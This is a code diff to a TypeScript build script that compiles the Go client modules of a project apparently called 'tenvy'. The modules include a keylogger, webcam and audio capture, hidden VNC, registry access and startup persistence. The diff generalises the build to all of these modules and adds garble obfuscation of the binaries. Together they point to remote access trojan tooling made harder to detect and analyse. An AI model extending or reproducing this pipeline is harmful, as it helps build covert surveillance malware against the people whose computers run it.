@@ -35,53 +35,47 @@ interface BuildResult {
 type PluginBuilder = (context: BuildContext) => Promise<BuildResult>;
 
 const pluginBuilders: Record<string, PluginBuilder> = {
-  "remote-desktop-engine": buildRemoteDesktopEngine,
+  "remote-desktop-engine": (context) => buildGoPlugin(context, "remote-desktop-engine"),
+  "webcam-engine": (context) => buildGoPlugin(context, "webcam-engine"),
+  "keylogger-engine": (context) => buildGoPlugin(context, "keylogger-engine"),
+  "audio-engine": (context) => buildGoPlugin(context, "audio-engine"),
+  "appvnc-engine": (context) => buildGoPlugin(context, "appvnc-engine"),
+  "filemanager-engine": (context) => buildGoPlugin(context, "filemanager-engine"),
+  "taskmanager-engine": (context) => buildGoPlugin(context, "taskmanager-engine"),
+  "tcpconnections-engine": (context) => buildGoPlugin(context, "tcpconnections-engine"),
+  "registry-engine": (context) => buildGoPlugin(context, "registry-engine"),
+  "startup-engine": (context) => buildGoPlugin(context, "startup-engine"),
+  "trigger-engine": (context) => buildGoPlugin(context, "trigger-engine"),
 };
 
-async function runCommand(command: string, args: string[], options: {
-  cwd?: string;
-  env?: NodeJS.ProcessEnv;
-} = {}): Promise<void> {
-  await new Promise<void>((resolve, reject) => {
-    const child = spawn(command, args, {
-      stdio: "inherit",
-      cwd: options.cwd,
-      env: options.env,
-    });
-
-    child.on("error", reject);
-    child.on("exit", (code, signal) => {
-      if (code === 0) {
-        resolve();
-        return;
-      }
-
-      const reason = code !== null ? `exit code ${code}` : `signal ${signal}`;
-      reject(new Error(`Command ${command} ${args.join(" ")} failed with ${reason}`));
-    });
-  });
-}
-
-async function buildRemoteDesktopEngine(context: BuildContext): Promise<BuildResult> {
+async function buildGoPlugin(context: BuildContext, cmdName: string): Promise<BuildResult> {
   const entrySegments = context.manifest.entry.split("/").filter(Boolean);
   if (entrySegments.length === 0) {
     throw new Error(`Manifest entry for ${context.manifest.id} is empty.`);
   }
 
-  const stageRoot = await fs.mkdtemp(path.join(os.tmpdir(), "tenvy-plugin-stage-"));
+  const stageRoot = await fs.mkdtemp(path.join(os.tmpdir(), `tenvy-plugin-stage-${context.manifest.id}-`));
   try {
     const outputPath = path.join(stageRoot, ...entrySegments);
     await fs.mkdir(path.dirname(outputPath), { recursive: true });
 
     const goEnv = { ...process.env, ...context.goEnv };
-    await runCommand(
-      "go",
-      ["build", "-trimpath", "-ldflags=-buildid=", "-o", outputPath, "."],
-      {
-        cwd: path.join(context.repoRoot, "tenvy-client", "cmd", "remote-desktop-engine"),
+    const goArgs = ["build", "-trimpath", "-ldflags=-buildid=", "-o", outputPath, "."];
+
+    const garbleAvailable = await checkGarbleAvailability();
+    if (garbleAvailable) {
+      console.log(`Building ${context.manifest.id} with garble obfuscation...`);
+      await runCommand("garble", ["-tiny", ...goArgs], {
+        cwd: path.join(context.repoRoot, "tenvy-client", "cmd", cmdName),
         env: goEnv,
-      }
-    );
+      });
+    } else {
+      console.warn(`Garble not found for ${context.manifest.id}, building without obfuscation.`);
+      await runCommand("go", goArgs, {
+        cwd: path.join(context.repoRoot, "tenvy-client", "cmd", cmdName),
+        env: goEnv,
+      });
+    }
 
     const fixedDate = new Date("2024-01-01T00:00:00Z");
     await fs.utimes(outputPath, fixedDate, fixedDate);
